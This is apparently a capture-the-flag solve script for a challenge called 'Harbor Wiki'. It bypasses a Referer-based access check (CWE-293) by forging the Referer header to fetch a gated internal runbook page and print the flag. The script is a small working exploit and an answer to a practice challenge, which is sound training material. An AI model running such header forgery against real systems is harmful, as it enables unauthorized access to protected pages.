#!/usr/bin/env python3
"""
Harbor Wiki (auth, 100) — CWE-293, Referer header trusted for authentication.

The internal ops runbook is "protected" only by a Referer check: the server
serves it if the request claims to come from the internal staff-home page.
Referer is client-controlled, so we just forge it.

Usage:
    python3 solve.py                          # defaults to auth2.chal.deti:8061
    python3 solve.py http://auth2.chal.deti:8061
"""
import re
import sys
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth2.chal.deti:8061"
GATED = f"{BASE}/wiki/internal/ops-runbook"
AUTHORIZED_REFERER = f"{BASE}/wiki/staff-home"

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    r = requests.get(GATED, headers={"Referer": AUTHORIZED_REFERER}, timeout=10)
    print(f"[{r.status_code}] GET {GATED}  (Referer: {AUTHORIZED_REFERER})")

    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0

    print("[!] no flag found — server response:\n")
    print(r.text)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
